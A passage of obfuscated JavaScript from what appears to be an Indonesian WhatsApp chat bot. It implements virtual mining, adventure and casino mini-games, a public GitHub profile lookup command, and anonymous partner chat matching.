getBuffer(_0x242229(0x163),{'method':_0x242229(0xb2)}),setTimeout(()=>{const _0x34572b=_0x242229,_0x22a98b=Math[_0x34572b(0xcb)](Math['random']()*0x32),_0x2ac5c0=Math[_0x34572b(0xcb)](Math['random']()*0x50);addOre(sender,_0x22a98b),addStone(sender,_0x2ac5c0),sendButImage(from,'*Congratulation\x20🎊*'+enter+enter+_0x34572b(0x151)+_0x22a98b+_0x34572b(0x117)+_0x2ac5c0+_0x34572b(0xf2)+enter+enter+_0x34572b(0x13e)+prefix+_0x34572b(0xdb),botname+_0x34572b(0xe9)+ownername,seoe,[{'buttonId':_0x34572b(0x182),'buttonText':{'displayText':_0x34572b(0x186)},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x5d0463=_0x242229;reply(_0x5d0463(0xca));},0x0);else{if(tempsa===_0x242229(0x12c))seye=await getBuffer(_0x242229(0x13a),{'method':_0x242229(0xb2)}),setTimeout(()=>{const _0x2001a2=_0x242229,_0x4832b6=Math[_0x2001a2(0xcb)](Math[_0x2001a2(0x16d)]()*0x28),_0x50b3e6=Math[_0x2001a2(0xcb)](Math[_0x2001a2(0x16d)]()*0x3c);addOre(sender,_0x4832b6),addStone(sender,_0x50b3e6),sendButImage(from,'*Congratulation\x20🎊*'+enter+enter+_0x2001a2(0x151)+_0x4832b6+'*\x20copper\x20ore\x20dan\x20'+_0x50b3e6+'\x20batu'+enter+enter+'Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20'+prefix+_0x2001a2(0xdb),botname+'™©\x20|\x20By\x20'+ownername,seye,[{'buttonId':_0x2001a2(0x182),'buttonText':{'displayText':_0x2001a2(0x186)},'type':_0x2001a2(0x167)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x1d5202=_0x242229;reply(_0x1d5202(0xca));},0x0);else{if(tempsa==='gerbil\x20woods')siae=await getBuffer(_0x242229(0x112),{'method':'get'}),setTimeout(()=>{const _0x26026a=_0x242229,_0x5060c7=Math[_0x26026a(0xcb)](Math['random']()*0x5a),_0xd2a83=Math[_0x26026a(0xcb)](Math['random']()*0x2d);addStone(sender,_0x5060c7),addKayu(sender,_0xd2a83),sendButImage(from,'*Congratulation\x20🎊*'+enter+enter+_0x26026a(0x151)+_0x5060c7+_0x26026a(0x180)+_0xd2a83+_0x26026a(0x170)+enter+enter+'Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20'+prefix+'inventory',botname+'™©\x20|\x20By\x20'+ownername,siae,[{'buttonId':'inv','buttonText':{'displayText':_0x26026a(0x186)},'type':_0x26026a(0x167)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0xa7afc9=_0x242229;reply(_0xa7afc9(0xca));},0x0);else tempsa===_0x242229(0x16a)?(bbbb=await getBuffer('https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg',{'method':_0x242229(0xb2)}),setTimeout(()=>{const _0x274941=_0x242229,_0x5130fc=Math[_0x274941(0xcb)](Math[_0x274941(0x16d)]()*0xc8),_0x356dc8=Math[_0x274941(0xcb)](Math[_0x274941(0x16d)]()*0x14);addStone(sender,_0x5130fc),addKayu(sender,_0x356dc8),sendButImage(from,_0x274941(0x17e)+enter+enter+'Kamu\x20mendapatkan\x20*'+_0x5130fc+'*\x20batu\x20dan\x20'+_0x356dc8+_0x274941(0x15a)+enter+enter+_0x274941(0x13e)+prefix+_0x274941(0xdb),botname+_0x274941(0xe9)+ownername,bbbb,[{'buttonId':'inv','buttonText':{'displayText':_0x274941(0x186)},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{reply('Sedang\x20berpetualang,\x20silahkan\x20tunggu...');},0x0)):(seae=await getBuffer(_0x242229(0xc7),{'method':_0x242229(0xb2)}),tesk=_0x242229(0x126)+prefix+'jelajah\x20corbiens\x20river\x0a\x0aSumber\x20Nama\x20tempat\x20\x20_https://www.fantasynamegenerators.com/_',alpha[_0x242229(0x113)](from,seae,image,{'thumbnail':seae,'quoted':mek,'caption':tesk}));}}}}}await gameAdd(sender,glimit);break;case _0x242229(0x115):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);setTimeout(()=>{const _0x1501b5=_0x242229,_0x53c618=Math[_0x1501b5(0xcb)](Math['random']()*0x64),_0x57a0f3=Math[_0x1501b5(0xcb)](Math[_0x1501b5(0x16d)]()*0x1e),_0x3b1b40=Math[_0x1501b5(0xcb)](Math[_0x1501b5(0x16d)]()*0xa);addStone(sender,_0x53c618),addCoal(sender,_0x57a0f3),addOre(sender,_0x3b1b40),reply(_0x1501b5(0x17e)+enter+enter+_0x1501b5(0x16b)+_0x53c618+_0x1501b5(0x144)+_0x57a0f3+_0x1501b5(0x12e)+_0x3b1b40+'*\x20ore');},0xbb8),setTimeout(()=>{reply('Sedang\x20menambang,\x20silahkan\x20tunggu...');},0x0),await gameAdd(sender,glimit);break;case _0x242229(0x15c):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':'Check\x20Limit'},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);setTimeout(()=>{const _0x17e88a=_0x242229,_0x46d182=Math[_0x17e88a(0xcb)](Math['random']()*0x14);addKayu(sender,_0x46d182),reply(_0x17e88a(0x17e)+enter+enter+_0x17e88a(0x137)+_0x46d182+_0x17e88a(0x184));},0xbb8),setTimeout(()=>{const _0xbb0435=_0x242229;reply(_0xbb0435(0xde));},0x0),await gameAdd(sender,glimit);break;case _0x242229(0x14d):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang['limitg'](prefix),'©\x20'+ownername,[{'buttonId':'limit','buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);setTimeout(()=>{const _0x180568=_0x242229,_0x43d914=Math[_0x180568(0xcb)](Math[_0x180568(0x16d)]()*0x64),_0x5949be=[_0x180568(0xc8),_0x180568(0x183),_0x180568(0x11f),_0x180568(0x13c),_0x180568(0x153),_0x180568(0x135),_0x180568(0xd2)],_0x4485d0=_0x5949be[Math[_0x180568(0xfa)](Math[_0x180568(0x16d)]()*_0x5949be[_0x180568(0x161)])];addPlanet(sender,_0x43d914),reply('*Congratulation\x20🎊*'+enter+enter+_0x180568(0x137)+_0x43d914+_0x180568(0x14f)+_0x4485d0+_0x180568(0x176));},0xbb8),setTimeout(()=>{const _0x359206=_0x242229;reply(_0x359206(0xbf));},0x0),await gameAdd(sender,glimit);break;case'jualbahankimia':if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':_0x242229(0x13b)},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang[_0x242229(0x177)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':_0x242229(0x150)},'type':0x1}]);buayar=body['slice'](0x10);const hargakimia=0x3e8,dapetin=buayar*hargakimia;if(getBertualangPlanet(sender)<=0x1)return reply('maaf\x20'+pushname+_0x242229(0x152));getBertualangPlanet(sender)>=0x1&&(jualbahankimia(sender,buayar),addKoinUser(sender,dapetin),await reply(_0x242229(0xec)+enter+enter+_0x242229(0xd4)+buayar+enter+_0x242229(0x134)+dapetin+enter+enter+_0x242229(0x11e)+getBertualangPlanet(sender)+enter+_0x242229(0x181)+checkATMuser(sender)+enter+enter+'Penjualan\x20berhasil\x20dengan\x20nomor\x20pembayaran\x20d88288bak1920kal'));await gameAdd(sender,glimit);break;case _0x242229(0x128):teks=_0x242229(0x12d)+pushname+'_\x20adalah:*\x0a\x0a*_'+getBertualangPlanet(sender)+'_*',alpha[_0x242229(0x113)](from,teks,text,{'quoted':mek});break;case _0x242229(0x114):case _0x242229(0xcc):if(isGame(sender,isPremium,isCreator,isOwner,gcounttuser,glimit))return sendButMessage(from,lang[_0x242229(0x108)](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0x103),'buttonText':{'displayText':'Check\x20Limit'},'type':0x1}]);if(!isEventon)return sendButMessage(from,lang['event'](prefix),'©\x20'+ownername,[{'buttonId':_0x242229(0xfb),'buttonText':{'displayText':'Event\x20On'},'type':0x1}]);cas=q;if(checkATMuser(sender)<cas)return reply(_0x242229(0xd3));if(args['length']<0x1)return reply(_0x242229(0x15b));if(isNaN(cas))return reply(_0x242229(0xd6));const resg=['Kamu\x20MENANG!!','Kamu\x20KALAH!!'];bayar=confirmATM(sender,cas),setTimeout(()=>{const _0xd6ce18=_0x242229,_0x17985b=Math['ceil'](Math[_0xd6ce18(0x16d)]()*0x2),_0x481e56=cas+0x0,_0x2beb2a=resg[Math[_0xd6ce18(0xfa)](Math[_0xd6ce18(0x16d)]()*resg[_0xd6ce18(0x161)])];if(_0x2beb2a==_0xd6ce18(0x116))addKoinUser(sender,_0x481e56),reply(_0xd6ce18(0x17e)+enter+enter+'Kamu\x20memenangkan\x20casino\x20sebesar\x20*_'+_0x481e56+'_*'+enter+enter+'Kumpulkan\x20uang\x20untuk\x20membeli\x20limit');else _0x2beb2a==_0xd6ce18(0x17f)?(confirmATM(sender,cas),reply(_0xd6ce18(0xfc)+cas)):reply(_0xd6ce18(0x10a));},0xbb8),setTimeout(()=>{reply('Menunggu\x20hasil!.');},0x0),await gameAdd(sender,glimit);break;case'inv':case _0x242229(0x149):case _0x242229(0xdb):inventory=_0x242229(0xf7)+getMiningcoal(sender)+_0x242229(0xd1)+getMiningstone(sender)+'\x0a❄️\x20*COPPER\x20ORE*\x20:\x20'+getMiningore(sender)+'\x0a🛠️\x20*INGOT\x20ORE*\x20:\x20'+getMiningingot(sender)+_0x242229(0x106)+getNebangKayu(sender)+_0x242229(0xe7)+getMancingIkan(sender)+_0x242229(0x17a),alpha[_0x242229(0x113)](from,pp_userz,image,{'thumbnail':Buffer[_0x242229(0x12b)](0x0),'quoted':mek,'caption':inventory});break;case _0x242229(0x111):case _0x242229(0x124):case _0x242229(0xba):{if(args[_0x242229(0x161)]<0x1)return reply(_0x242229(0xdc)+prefix+'ghstalk*\x20zeeoneofc');reply(lang[_0x242229(0x165)]());let y=await fetchJson(_0x242229(0x148)+q),ppgt=await getBuffer(y[_0x242229(0x127)]),text=_0x242229(0x162)+enter+enter+'📛\x20Username\x20:\x20'+y['login']+enter+'🥰\x20Name\x20:\x20'+y[_0x242229(0xf4)]+enter+_0x242229(0xe6)+y['id']+enter+_0x242229(0xbd)+y[_0x242229(0xee)]+enter+_0x242229(0xf0)+y[_0x242229(0xeb)]+enter+_0x242229(0xfe)+y[_0x242229(0x157)]+enter+_0x242229(0x123)+y['type']+enter+_0x242229(0x17d)+y[_0x242229(0x14c)]+enter+_0x242229(0xc2)+y[_0x242229(0x175)]+enter+'📍\x20Location\x20:\x20'+y['location']+enter+'📧\x20Email\x20:\x20'+y['email']+enter+_0x242229(0x156)+y[_0x242229(0x101)]+enter+_0x242229(0x142)+y['twitter_username']+enter+'🔮\x20Public\x20Repo\x20:\x20'+y[_0x242229(0x119)]+enter+_0x242229(0x11c)+y[_0x242229(0xea)]+enter+_0x242229(0x118)+moment(y[_0x242229(0xf3)])['tz'](_0x242229(0x155))[_0x242229(0x12a)]('id')[_0x242229(0xef)](_0x242229(0xcf))+enter+_0x242229(0xf8)+moment(y[_0x242229(0x104)])['tz'](_0x242229(0x155))[_0x242229(0x12a)]('id')[_0x242229(0xef)]('HH:mm:ss\x20DD/MM/YYYY')+enter+_0x242229(0xda)+q;alpha['sendMessage'](from,ppgt,image,{'caption':text,'quoted':mek}),await limitAdd(sender,limit);}break;case _0x242229(0x10b):{const flamingtext=_0x242229(0xe3);if(isGroup)return reply(_0x242229(0xd9));this['anonymous']=this[_0x242229(0x10b)]?this[_0x242229(0x10b)]:{},anonymousloc=await getBuffer(flamingtext+_0x242229(0xc5)),sendButLocation(from,'Welcome\x20To\x20Anonymous\x20Chat\x0a\x0a'+prefix+_0x242229(0xe5)+prefix+_0x242229(0xe2)+prefix+_0x242229(0xd0),'©\x20Copyright\x20'+botname+'\x202K21',anonymousloc,[{'buttonId':'menu','buttonText':{'displayText':'MENU'},'type':0x1},{'buttonId':_0x242229(0x125),'buttonText':{'displayText':_0x242229(0xed)},'type':0x1}],{'quoted':mek});}break;case _0x242229(0x13f):case _0x242229(0xb5):{if(isGroup)return reply(_0x242229(0xd9));this[_0x242229(0x10b)]=this[_0x242229(0x10b)]?this[_0x242229(0x10b)]:{};let room=Object[_0x242229(0x105)](this[_0x242229(0x10b)])[_0x242229(0xe4)](_0x2b37b7=>_0x2b37b7['check'](m[_0x242229(0x107)]));if(!room){await sendButMessage(from,'Kamu\x20Tidak\x20Berada\x20Di\x20Anonymous\x20Chat,\x20Klik\x20Dibawah\x20Untuk\x20Start\x20Anonymous\x20Chat',_0x242229(0x109)+botname+'\x202021',[{'buttonId':'start','buttonText':{'displayText':'START'},'type':0x1}],{'quoted':mek});throw![];}sendButMessage(from,_0x242229(0x17c),_0x242229(0x109)+botname+'\x202021',[{'buttonId':_0x242229(0x125),'buttonText':{'displayText':_0x242229(0xed)},'type':0x1}],{'quoted':mek});let other=room['other'](m[_0x242229(0x107)]);if(other)await sendButMessage(other,_0x242229(0x179),_0x242229(0x109)+botname+_0x242229(0xf9),[{'buttonId':_0x242229(0x125),'buttonText':{'displayText':_0x242229(0xed)},'type':0x1}],{'quoted':mek});delete this[_0x242229(0x10b)][room['id']];if(command==='leave')break;}case _0x242229(0x146):case _0x242229(0x125):{if(isGroup)return reply(_0x242229(0xd9));this[_0x242229(0x10b)]=this[_0x242229(0x10b)]?this[_0x242229(0x10b)]:{};if(Object['values'](this[_0x242229(0x10b)])[_0x242229(0xe4)](_0x160f4c=>_0x160f4c[_0x242229(0x120)](m['sender']))){await sendButMessage(from,_0x242229(0xdd),'©\x20Copyright\x20'+botname+_0x242229(0xf9),[{'buttonId':'leave','buttonText':{'displayText':_0x242229(0x178)},'type':0x1}],{'quoted':mek});throw![];}let room=Object[_0x242229(0x105)](this[_0x242229(0x10b)])['find'](_0x1e6c79=>_0x1e6c79['state']==='WAITING'&&!_0x1e6c79[_0x242229(0x120)](m[_0x242229(0x107)]));if(room)await sendButMessage(room['a'],_0x242229(0x130),'©\x20Copyright\x20'+botname+_0x242229(0xf9),[{'buttonId':'leave','buttonText':{'displayText':_0x242229(0x178)},'type':0x1},{'buttonId':'skip','buttonText':{'displayText':_0x242229(0xe0)},'type':0x1}],{'quoted':mek}),room['b']=m[_0x242229(0x107)],room[_0x242229(0x132)]='CHATTING',await sendButMessage(room['b'],_0x242229(0x130),_0x242229(0x109)+botname+_0x242229(0xf9),[{'buttonId':'leave','buttonText':{'displayText':_0x242229(0x178)},'type':0x1},{'buttonId':_0x242229(0x122),'buttonText':{'displayText':_0x242229(0xe0)},'type':0x1}],{'quoted':mek});else{let id=+new Date();this['anonymous'][id]={'id':id,'a':m['sender'],'b':'','state':_0x242229(0x16c),'check':function(_0x33937a=''){const _0x35945b=_0x242229;return[this['a'],this['b']][_0x35945b(0xb8)](_0x33937a);},'other':function(_0x5aadf6=''){return _0x5aadf6===this['a']?this['b']:_0x5aadf6===this['b']?this['a']:'';}},await sendButMessage(m[_0x242229(0x139)],_0x242229(0xe8),_0x242229(0x109)+botname+'\x202021',[{'buttonId':_0x242229(0xb5),'buttonText':{'displayText':_0x242229(0x178)},'type':0x1}],{'quoted':mek});}break;}case'next':case _0x242229(0x122):case _0x242229(0xc0):{if(isGroup)return reply(_0x242229(0x10e));this[_0x242229(0x10b)]=this[_0x242229(0x10b)]?this[_0x242229(0x10b)]:{};let romeo=Object[_0x242229(0x105)](this[_0x242229(0x10b)])[_0x242229(0xe4)](_0x259a90=>_0x259a90[_0x242229(0x120)](m[_0x242229(0x107)]));if(!romeo){await sendButMessage(from,_0x242229(0x187),_0x242229(0x109)+botname+_0x242229(0xf9),[{'buttonId':'start','buttonText':{'displayText':'START'},'type':0x1}],{'quoted':mek});throw![];}let other=romeo['other'](m['sender']);if(other)sendButMessage(other,_0x242229(0x179),_0x242229(0x147)+botname+'\x202021',[{'buttonId':_0x242229(0x125),'buttonText':{'displayText':_0x242229(0xed)},'type':0x1}],{'quoted':mek});delete this[_0x242229(0x10b)][romeo['id']];let room=Object['values'](this[_0x242229(0x10b)])[_0x242229(0xe4)](_0x1cfa2c=>_0x1cfa2c[_0x242229(0x132)]==='WAITING'&&!_0x1cfa2c[_0x242229(0x120)](m[_0x242229(0x107)]));if(room)await sendButMessage(room['a'],_0x242229(0x130),'©\x20Copyright\x20'+botname+'\x202021',[{'buttonId':_0x242229(0xb5),'buttonText':{'displayText':_0x242229(0x178)},'type':0x1},{'buttonId':_0x242229(0x122),'buttonText':{'displayText':_0x242229(0xe0)},'type':0x1}],{'quoted':mek}),room['b']=m['sender'],room[_0x242229(0x132)]=_0x242229(0x185),await sendButMessage(room['b'],_0x242229(0x130),_0x242229(0x109)+botname+_0x242229(0xf9),[{'buttonId':_0x242229(0xb5),'buttonText':{'displayText':_0x242229(0x178)},'type':0x1},{'buttonId':'skip','buttonText':{'displayText':_0x242229(0xe0)},'type':0x1}],{'quoted':mek});else{let id=+new Date();this[_0x242229(0x10b)][id]={'id':id,'a':m[_0x242229(0x107)],'b':'','state':_0x242229(0x16c),'check':function(_0x5d9430=''){const _0x530bb7=_0x242229;return[this['a'],this['b']][_0x530bb7(0xb8)](_0x5d9430);},'other':function(_0x55a905=''){return _0x55a905===this['a']?this['b']:_0x55a905===this['b']?this['a']:'';}},await sendButMessage(m[_0x242229(0x139)],'⏳\x20_Menunggu\x20Partner_',_0x242229(0x109)+botname+_0x242229(0xf9),[{'buttonId':_0x242229(0xb5),'buttonText':{'displayText':_0x242229(0x178)},'type':0x1}],{'quoted':mek});}break;}}function _0x4e0a(_0x51bf30,_0x4f91a2){const _0x6b29a1=_0x6b29();return _0x4e0a=function(_0x4e0af6,_0x190e09){_0x4e0af6=_0x4e0af6-0xb2;let _0x4dc2d0=_0x6b29a1[_0x4e0af6];return _0x4dc2d0;},_0x4e0a(_0x51bf30,_0x4f91a2);}function _0x6b29(){const _0x54b5af=['*Sisa\x20coal:*\x20','mulai','©\x20Copyright\x20\x20','https://api.github.com/users/','tas','jualingot','jualkayu','company','goplanet','*\x20ikan','*bahan\x20kimia\x20dari\x20*','Event\x20On','Kamu\x20mendapatkan\x20*','\x20kamu\x20tidak\x20punya\x20bahankimia','saturnus','\x20stone\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20stone','Asia/Jakarta','💌\x20Bio\x20:\x20','following','633doWBmO','1349462QtKjLL','\x20kayu','Mau\x20taruhan\x20berapa','nebang','cochher\x20sea','Sedang\x20mining\x20selama\x202\x20menit,\x20silahkan\x20tunggu...','string','2026171KXGruz','length','*-----\x20「GITHUB\x20STALK」-----*','https://telegra.ph/file/19a10ff95c31af10267e4.jpg','endsWith','wait','Keluar','RESPONSE','join','.stop','moobiens\x20grassland','\x20kamu\x20mendapatkan\x20*','WAITING','random','corbiens\x20river','.next','*\x20kayu','\x20kayu\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20kayu','*「\x20PENJUALAN\x20BERHASIL\x20\x20」*','jelajah','\x20kamu\x20tidak\x20punya\x20coal','blog','*\x20selama\x202\x20tahun','event','LEAVE','📛\x20_Partner\x20meninggalkan\x20chat_','\x0a\x0aSilahkan\x20bermain\x20game\x20untuk\x20mendapatkan\x20lebih\x20banyak\x20inventory','Stop','🏃\x20_Berhasil\x20Keluar\x20Dari\x20Sesi\x20Anonymous\x20Chat_','🔏\x20Company\x20:\x20','*Congratulation\x20🎊*','Kamu\x20KALAH!!','*\x20batu\x20dan\x20*','*Sisa\x20uang:*\x20','inv','venus','*kayu\x20selama\x202\x20menit','CHATTING','My\x20Inventory\x20🗃️','Kamu\x20Tidak\x20Berada\x20Di\x20Anonymous\x20Chat,\x20Klik\x20Dibawah\x20Untuk\x20Start\x20Anonymous\x20Chat','get','*Jumlah\x20Kayu\x20dijual:*\x20','replace','leave','https://telegra.ph/file/eabfc907cfc447386b0c0.jpg','jualikan','includes','jualstone','ghuser','karena\x20anda\x20owner\x20kami\x20dari\x20team\x20bot\x20mengirim\x20','adventure','🉑\x20Node\x20ID\x20:\x20','988780fLSZXJ','Sedang\x20bertualang,\x20silahkan\x20tunggu...\x202\x20tahun','lanjut','map','🌐\x20Blog\x20:\x20','*\x20Ikan\x20selama\x202\x20menit','Lanjut','Anonymous\x20Chat','\x0a\x0a*Sisa\x20Ore:*\x20','https://telegra.ph/file/16857796fab2ccb6cffc2.jpg','merkurius','\x20ore\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ore','Sedang\x20berpetualang,\x20silahkan\x20tunggu...','ceil','casino','msg','Sedang\x20Memancing,\x20silahkan\x20tunggu...','HH:mm:ss\x20DD/MM/YYYY','leave\x20-\x20Leave\x20Partner','\x0a🛑\x20*STONE*\x20:\x20','uranus','Uang\x20mu\x20tidak\x20mencukupi\x20untuk\x20melakukan\x20judi','*Jumlah\x20bahankimia\x20dijual:*\x20','778746AwInDI','Mua\x20taruhan\x20berapa?','\x20ingot\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20ingot','Cari\x20Partner','Only\x20private\x20chat','➿\x20Url\x20:\x20https://github.com/','inventory','Kirim\x20perintah\x20*','Kamu\x20Masih\x20Berada\x20Di\x20Anonymous\x20Chat\x20!','Sedang\x20menambang,\x20silahkan\x20tunggu...','*Sisa\x20Ingot:*\x20','SKIP','Xp\x20untuk\x20anda','skip\x20-\x20Skip\x20Partner\x0a','https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=','find','start\x20-\x20Search\x20Partner\x0a','🆔\x20ID\x20:\x20','\x0a🐬\x20*FISH*\x20:\x20','⏳\x20_Menunggu\x20Partner_','™©\x20|\x20By\x20','public_gists','followers','*「\x20PENJUALAN\x20BERHASIL\x20」*','START','node_id','format','🔥\x20Followers\x20:\x20','mancing','\x20batu','created_at','name','*Congratulation\x20🎊*\x0a\x0a\x20kamu\x20mendapatkan\x20*','*Jumlah\x20Coal\x20dijual:*\x20','\x0a🗃️\x20*USER\x20INVENTORY*\x20🗃️\x20\x0a\x0a🎢\x20*COAL*\x20:\x20','📖\x20Update\x20:\x20','\x202021','floor','event\x20on','Kamu\x20kalah\x20🥺\x20dan\x20kehilangan\x20uang\x20sebesar\x20','*Jumlah\x20Batu\x20dijual:*\x20','♎\x20Following\x20:\x20','36IkhbSW','*Sisa\x20ikan:*\x20','bio','Maaf\x20','limit','updated_at','values','\x0a🌐\x20*WOOD*\x20:\x20','sender','limitg','©\x20Copyright\x20','Error\x20','anonymous','contextInfo','.start','Fitur\x20Tidak\x20Dapat\x20Digunakan\x20Untuk\x20Group!','test','isArray','ghstalk','https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg','sendMessage','judi','nambang','Kamu\x20MENANG!!','*\x20copper\x20ore\x20dan\x20','📅\x20Created\x20:\x20','public_repos','exec','*Jumlah\x20Ingot\x20dijual:*\x20','🌍\x20Public\x20Gits\x20:\x20','*Sisa\x20Batu:*\x20','*Sisa\x20bahankimia:*\x20','mars','check','13564gWcSKG','skip','📝\x20Type\x20:\x20','githubstalk','start','*PILIH\x20WILAYAH\x20YANG\x20INGIN\x20KAMU\x20JELAJAHI*\x0a\x0a\x0a⚪\x20Corbiens\x20River\x0a🔵\x20Cochher\x20Sea\x0a⚫\x20Moobiens\x20Grassland\x0a🟣\x20Gerbil\x20Woods\x0a🟢\x20Chiltawa\x20Woods\x0a🟠\x20Limingstall\x20Mountains\x0a🔴\x20Chade\x20Mountain\x0a\x0aExample\x20:\x0a-\x20','avatar_url','sisabahankimia','*Jumlah\x20ikan\x20dijual:*\x20','locale','alloc','chade\x20mountain','*Jumlah\x20bahankimia\x20Yang\x20didapatkan\x20_','*\x20coal\x20,\x20dan\x20*','24pOtIbb','_Partner\x20Ditemukan_\x20🎭','mining','state','192915Bdgfzi','*Uang\x20didapat:*\x20','neptunus','text','kamu\x20mendapatkan\x20*','282388UWVXYa','chat','https://telegra.ph/file/efdcd7d07dd22294695a8.jpg','Check\x20Limit','jupiter','Xp*','Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20','keluar','quoted','*Sisa\x20Kayu\x20:*\x20','📭\x20Twitter\x20Username\x20:\x20','Proses\x20berhasil\x20dengan\x20nomer\x20pembayaran\x20d88288bak1920kal','*\x20batu\x20,\x20*'];_0x6b29=function(){return _0x54b5af;};return _0x6b29();}
if (isGroup && budy != undefined) {
	} else {
	console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CHAT \x1b[1;37m]', timuu, color(q), 'from', color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
